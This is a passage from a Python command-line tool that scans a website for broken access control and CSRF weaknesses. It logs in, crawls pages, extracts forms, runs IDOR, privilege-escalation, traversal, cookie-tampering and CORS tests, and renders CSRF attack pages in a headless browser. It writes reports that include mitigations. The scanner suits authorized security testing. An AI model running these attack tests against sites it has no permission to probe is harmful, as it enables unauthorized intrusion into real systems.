                    ("duplicate_token", html_duplicate_token(act.url, act.params), "POST"),
                    ("samesite_refresh", html_samesite_refresh(act.url, act.params), "POST"),
                    ("referer_bypass", html_referer_bypass(act.url, act.params), "POST"),
                    ("subdomain_bypass", html_subdomain_bypass(act.url, act.params), "POST"),
                    ("method_override", html_method_override(act.url, act.params), "GET"),
                ]
                for vid, html, rm in vecs:
                    row = {"action": act.name, "url": act.url, "vector": vid, "req_method": rm,
                           "status": None, "exploited": False, "note": None, "mitigation": None, "curl": f"curl -X {rm} '{act.url}'"}
                    try:
                        # Primary: set_content (fast)
                        try:
                            page.set_content(html, wait_until="domcontentloaded")
                            page.wait_for_timeout(200)
                            status = 200
                        except Exception:
                            try:
                                safe_html = f"<!doctype html><meta charset='utf-8'><body>{html}</body>"
                                data_url = "data:text/html;charset=utf-8," + requests.utils.requote_uri(safe_html)
                                page.goto(data_url, wait_until="domcontentloaded", timeout=int(per_action_timeout * 1000))
                                page.wait_for_timeout(200)
                                status = 200
                            except Exception:
                                try:
                                    safe_srcdoc = html.replace("'", "&#39;").replace("\n", "")
                                    wrapper = "<iframe sandbox='allow-scripts allow-forms' srcdoc='{}'></iframe>".format(safe_srcdoc)
                                    page.set_content(wrapper, wait_until="domcontentloaded")
                                    page.wait_for_timeout(200)
                                    status = 200
                                except Exception:
                                    status = 500
                        exploited_flag, why = classify_exploit(csrf_applicable, jwt_based, vid, status)
                        mit = "Use CSRF tokens + SameSite=strict and strict Origin/Referer checks." if exploited_flag else "N/A"
                        row.update({"status": status, "exploited": exploited_flag, "note": why, "mitigation": mit})
                    except Exception as e:
                        row.update({"status": 500, "exploited": False, "note": f"Error: {e}", "mitigation": "N/A"})
                    results.append(row)
                    if row.get("exploited"):
                        exploited.append({"action": act.name, "vector": vid, "status": row.get("status"), "note": row.get("note"), "mitigation": row.get("mitigation")})

            try:
                browser.close()
            except Exception:
                pass
    except Exception as outer:
        print(f"[!] CSRF suite fatal error: {outer}")
    finally:
        return write_csrf_reports(base, results, exploited, out_dir, domain)

# -----------------------
# Combined orchestration (concurrent BAC tests + CSRF suite)
# -----------------------
def run_bac_scan(base_url, user_creds, admin_creds=None, max_depth=3, workers=MAX_WORKERS):
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    safe_name = base_url.replace("https://", "").replace("http://", "").replace("/", "_")
    report_dir = os.path.join("reports", safe_name, ts)
    os.makedirs(report_dir, exist_ok=True)

    session = login(base_url, user_creds.get("username"), user_creds.get("password"))
    links = crawl_site_multithread(base_url, session, max_depth=max_depth, max_workers=workers)
    print(f"[+] Crawled {len(links)} links and extracted forms will be inspected.")

    results = {"site": base_url, "timestamp": ts, "crawled_links": len(links), "links_discovered": links, "tests": []}

    # Build form list
    forms = []
    for l in links:
        try:
            fms = extract_forms(l, session)
            for f in fms:
                forms.append(f)
        except Exception:
            continue

    # BAC tests — run per-test concurrently across links to speed up
    parsed = urlparse(base_url)
    host = parsed.hostname or ""
    tests_to_run = [
        ("IDOR", lambda: sum((test_idor(l, session) for l in links), [])),
        ("Privilege Escalation", lambda: test_privilege(base_url, session, admin_creds)),
        ("Directory Traversal", lambda: test_directory(base_url, session)),
        ("Method Bypass", lambda: sum((test_method_bypass(l, session) for l in links), [])),
        ("Force Browsing", lambda: test_force_browse(base_url, session)),
        ("Header/Token Tampering", lambda: test_header_token(base_url, session)),
        ("Cookie Manipulation", lambda: test_cookie_manipulation(base_url, session)),
        ("CORS Misconfiguration", lambda: test_cors(base_url, session)),
        ("TLS", lambda: [{"status": tls_check(host)}])
    ]

    test_results = []
    with ThreadPoolExecutor(max_workers=min(len(tests_to_run), workers)) as ex:
        future_map = {ex.submit(fn): name for name, fn in tests_to_run}
        for fut in as_completed(list(future_map.keys())):
            name = future_map[fut]
            try:
                res = fut.result(timeout=REQUEST_TIMEOUT * 10)
            except Exception as e:
                res = [{"status": "Error", "risk": "Unknown", "details": str(e), "mitigation": "N/A", "cvss": cvss_score_for_risk("Unknown")}]
            # Ensure each result has cvss
            for r in (res or []):
                if "cvss" not in r:
                    r["cvss"] = cvss_score_for_risk(r.get("risk", "Unknown"))
            test_results.append({"type": name, "results": res})

    results["tests"] = test_results

    # Write BAC JSON immediately (CSRF will add links)
    report_file = os.path.join(report_dir, "bac_report.json")
    with open(report_file, "w") as f:
        json.dump(results, f, indent=2)

    # Return both JSON path, dir, session, and forms
    return report_file, report_dir, session, forms

def build_csrf_cfg_from_forms(base_url, session, forms):
    actions = []
    for idx, f in enumerate(forms, 1):
        try:
            name = f.get("name") or f.get("id") or f"form_{idx}"
            method = f.get("method", "post").upper()
            params = f.get("params", {}) or {}
            actions.append({"name": name, "method": method, "url": f.get("url"), "params": params, "body_format": "form"})
        except Exception:
            continue
    cookie = {}
    try:
        ck = session.cookies.get_dict()
        if ck:
            sel = None
            for k in ck:
                if "session" in k.lower() or "sid" in k.lower():
                    sel = k
                    break
            if not sel:
                sel = next(iter(ck.keys()))
            cookie = {"name": sel, "value": ck.get(sel), "domain": urlparse(base_url).hostname, "path": "/"}
    except Exception:
        cookie = {}
    cfg = {"base_url": base_url, "actions": actions, "optional": {"jwt": False}, "session_cookie": cookie or {}}
    return cfg

# -----------------------
# CLI
# -----------------------
def main():
    parser = argparse.ArgumentParser(description="Unified BAC + CSRF scanner (multithreaded)")
    parser.add_argument("--base", required=True, help="Target site URL")
    parser.add_argument("--depth", type=int, default=3, help="Crawl depth (0 => only base page)")
    parser.add_argument("--user", default="", help="username (optional)")
    parser.add_argument("--pass", dest="passwd", default="", help="password (optional)")
    parser.add_argument("--admin-user", default=None, help="admin user (optional)")
    parser.add_argument("--admin-pass", default=None, help="admin pass (optional)")
    parser.add_argument("--workers", type=int, default=MAX_WORKERS, help="concurrent workers for crawling/tests")
    parser.add_argument("--skip-csrf", action="store_true", help="Skip CSRF suite")
    parser.add_argument("--csrf-max-actions", type=int, default=0, help="Limit actions for CSRF (0 => unlimited)")
    parser.add_argument("--csrf-timeout-sec", type=int, default=10, help="Per-action timeout seconds")
    parser.add_argument("--no-headless", action="store_true", help="Run Playwright headed (default headless)")
    args = parser.parse_args()

    base_url = args.base.rstrip("/")
    print(f"[+] Starting Combined scan on {base_url} at {time.strftime('%Y-%m-%d_%H-%M-%S')}...")

    json_report, report_dir, session, forms = run_bac_scan(base_url, {"username": args.user, "password": args.passwd},
                                                          admin_creds={"username": args.admin_user, "password": args.admin_pass} if args.admin_user and args.admin_pass else None,
                                                          max_depth=args.depth, workers=args.workers)

    # Build CSRF config
    csrf_cfg = build_csrf_cfg_from_forms(base_url, session, forms)
    csrf_outputs = None
    if csrf_cfg["actions"] and not args.skip_csrf:
        print(f"[+] Found {len(csrf_cfg['actions'])} forms — scheduling CSRF suite.")
        try:
            csrf_outputs = run_suite(csrf_cfg, out_dir=report_dir, max_actions=(args.csrf_max_actions if args.csrf_max_actions>0 else None),
                                    per_action_timeout=args.csrf_timeout_sec, headless=not args.no_headless)
            if csrf_outputs:
                print(f"[+] CSRF reports written: {csrf_outputs}")
        except Exception as e:
            print(f"[!] CSRF suite failed: {e}")
    else:
        if not csrf_cfg["actions"]:
            print("[!] No forms extracted — skipping CSRF suite.")
        else:
            print("[+] CSRF suite skipped by CLI.")

    # Attach CSRF links to BAC report and regenerate HTML
    include_csrf_links = None
    if csrf_outputs:
        # csrf_outputs returns (html,json,exploited_html,exploited_json,curl)
        # use basenames (CSRF files live in same report_dir), so HTML linking works from bac report
        csrf_html_basename = os.path.basename(csrf_outputs[0])
        csrf_json_basename = os.path.basename(csrf_outputs[1])
        include_csrf_links = (csrf_html_basename, csrf_json_basename)
        # load bac json, add csrf links to its top-level keys for template
        with open(json_report) as f:
            bac_data = json.load(f)
        bac_data["csrf_html"] = csrf_html_basename
        bac_data["csrf_json"] = csrf_json_basename
        with open(json_report, "w") as f:
            json.dump(bac_data, f, indent=2)
    # generate final reports (reads bac json)
    full_html, exploited_html = generate_reports(json_report, include_csrf_links=include_csrf_links)

    print("\n[+] BAC Scan Complete")
    print(f"    Site: {base_url}")
    with open(json_report) as f:
        data = json.load(f)
    total_tests = len(data.get("tests", []))
    total_findings = sum(len(t.get("results", [])) for t in data.get("tests", []))
    vulnerable = sum(1 for t in data.get("tests", []) for r in t.get("results", []) if r.get("status") == "Vulnerable")
    print(f"    Total Tests: {total_tests}")
    print(f"    Total Findings: {total_findings}")
    print(f"    Vulnerabilities: {vulnerable}")
    print(f"\n    Reports directory: {report_dir}")
    print(f"    Full BAC report (HTML): {full_html}")
    print(f"    Exploited-only (HTML): {exploited_html}")
    if csrf_outputs:
        print(f"    CSRF HTML: {csrf_outputs[0]}")
        print(f"    CSRF JSON: {csrf_outputs[1]}")
    print("\n[+] Done. View reports by running:")
    print("    python3 -m http.server 8001 --directory reports")
    print("    Open http://localhost:8001 in your browser.")

if __name__ == "__main__":
    main()
